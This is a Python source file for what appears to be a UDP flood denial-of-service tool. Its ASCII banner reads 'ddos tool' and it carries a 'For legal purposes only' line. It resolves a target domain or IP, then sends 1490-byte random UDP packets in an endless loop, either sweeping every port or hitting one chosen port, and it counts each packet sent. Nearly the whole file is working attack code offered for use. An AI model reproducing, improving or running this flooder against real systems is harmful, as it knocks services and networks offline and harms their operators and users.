from platform import system
from tqdm.auto import tqdm
import os
import time
import random
import socket
import pyfiglet

version = "0.1"

uname = system()

if uname == "Windows":
    cmd_clear = 'cls'
else:
    cmd_clear = 'clear'

os.system(cmd_clear)

sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
bytes = random._urandom(1490)


while True:
    print(
        """\033[92;1m                                                                                                                                                                                                     

  __      __                      __                  ___      
 /\ \    /\ \                    /\ \__              /\_ \     
 \_\ \   \_\ \    ___     ____   \ \ ,_\   ___     __\//\ \    
 /'_` \  /'_` \  / __`\  /',__\   \ \ \/  / __`\  / __`\ \ \   
/\ \_\ \/\ \_\ \/\ \_\ \/\__, `\   \ \ \_/\ \_\ \/\ \_\ \_\ \_ 
\ \___,_\ \___,_\ \____/\/\____/    \ \__\ \____/\ \____/\____\\
 \/__,_ /\/__,_ /\/___/  \/___/      \/__/\/___/  \/___/\/____/
                                                                                                                                                                                                                                                                                                                                                            
        """
    )
    print("\033[91mVersion {0}".format(version))
    print("\033[91mGithub: https://github.com/HUGOW04")
    print("\033[93mFor legal purposes only")
    print("\033[92;1m")
    print("1. Website Domain\n2. IP Adress\n3. Exit")

    choice = str(input("\n> "))

    if choice == '1':
        domain = str(input("domain: "))
        ip = socket.gethostbyname(domain)
        break
    elif choice == '2':
        ip = str(input("IP Address: "))
        break
    elif choice == "3":
        exit()
    
    else:
        print("\033[91mInvaild Choice!\033[0m")
        time.sleep(2)
        os.system(cmd_clear)

# Port selection.
port_mode = False # If 'False' all ports will be use, if 'True' - certain.
port = 2

while 1:
    port_bool = str(input("Certain port? [y/n]: "))

    if (port_bool == "y") or (port_bool == "Y"):
        port_mode = True
        port = int(input("Port: "))
        break

    elif (port_bool == "n") or (port_bool == "N"):
        break

    else:
        print('\033[91mInvaild Choice!\033[0m')
        time.sleep(2)

# Starting working.
os.system(cmd_clear)
print('\033[36;2mINITIALIZING....')
time.sleep(1)
print('STARTING...')
time.sleep(4)

sent = 0

if port_mode == False:  # All ports.
    try:
        while True:
            if port == 65534:
                port = 1

            elif port == 1900:
                port = 1901

            sock.sendto(bytes, (ip, port))
            sent += 1
            port += 1
            print("\033[32;1mSent %s packets to %s through port:%s"%(sent, ip, port))
    except:
        print('\n\033[31;1mExited\033[0m')

elif port_mode == True: # Certain port.
    if port < 2:
        port = 2
        
    elif port == 65534:
        port = 2

    elif port == 1900:
        port = 1901

    try:
        while True:
            sock.sendto(bytes, (ip, port))
            sent += 1
            print("\033[32;1mSent %s packets to %s through port:%s"%(sent, ip, port))      
    except:
        print('\n\033[31;1mExited\033[0m')